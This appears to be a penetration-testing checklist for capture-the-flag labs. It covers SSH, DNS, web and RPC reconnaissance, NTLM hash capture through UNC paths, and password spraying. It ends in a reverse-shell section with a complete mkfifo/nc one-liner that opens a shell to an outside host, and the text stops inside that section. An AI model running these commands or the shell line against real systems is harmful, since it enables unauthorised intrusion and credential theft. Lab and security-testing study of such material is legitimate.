# Methodology

- [Methodology](#methodology)
  - [Passive Reconnaissance](#passive-reconnaissance)
  - [Active Reconnaissance](#active-reconnaissance)
    - [TCP Services](#tcp-services)
      - [SSH](#ssh)
      - [DNS](#dns)
      - [Web](#web)
      - [RPC](#rpc)
    - [UDP Services](#udp-services)
  - [Reverse Shell](#reverse-shell)
  - [Privilege Escalation](#privilege-escalation)
    - [Linux](#linux)
    - [Windows](#windows)
  - [Container Escape or Docker Breakout](#container-escape-or-docker-breakout)
  - [LXC Breakout or LXC Escape](#lxc-breakout-or-lxc-escape)
  - [Active Directory](#active-directory)
  - [SQL](#sql)

## Passive Reconnaissance

## Active Reconnaissance

### TCP Services

#### SSH
- [ ] Check Version
  - [ ] 7.7 or less user enumeration
  - [ ] [CVE-2018-15473-Exploit-docker](https://github.com/sergiky/CVE-2018-15473-Exploit-docker)

#### DNS
- [ ] Check NS
- [ ] Check A
- [ ] Check any
- [ ] Check axfr

#### Web
- Hidden files
  - [ ] `robots.txt`
  - [ ] `sitemap.xml`
  - [ ] `.env`
  - [ ] `.git`
- Check console and source code
  - [ ] Check console from browser
  - [ ] Check source code of all the pages
- Fuzzing
  - [ ] Fuzzing directories
  - [ ] Fuzzing directories with a slash at the final: `http://example.htb/FUZZ`
  - [ ] Fuzzing files with extension: `.bak`, `.txt`, `.html`, `.php`, etc.
  - [ ] Fuzzing subdomains
  - [ ] Fuzzing API. Use endpoints wordlists for api (in SecLists for example)
- Use appropriate wordlists:
  - Normal fuzzing: `/usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2-3-medium...`
  - Subdomains: `/usr/share/wordlists/seclists/Discovery/DNS/subdomains-top-1-million-111...`
- Check technologies and vulnerabilities
  - [ ] Discover the technology usage and search for important CVE
- UNC For Windows
  - [ ] If you detect a place when you can do a LFI / File disclosure / IP field you can use UNC `\\<your-ip>\file` or `//<your-ip>/file`. And use responder to obtain the NTLM hash cleartext password.
- APIs
  - [ ] Fuzzing APIs to discover hidden endpoints.

#### RPC
- [ ] Is anonymous access allowed?
- [ ] Can you access with valid credential?
- [ ] Can you obtain the password policy?
- [ ] Can you obtain the usernames?
- [ ] Can you obtain the description of the usernames?
- [ ] You need to do password spraying?

### UDP Services

---

## Reverse Shell
- [ ] Try to `bash -c 'bash -i'`
- [ ] Try with `bash -i`
- [ ] Try with the old version of `nc`:
  ```bash
  rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
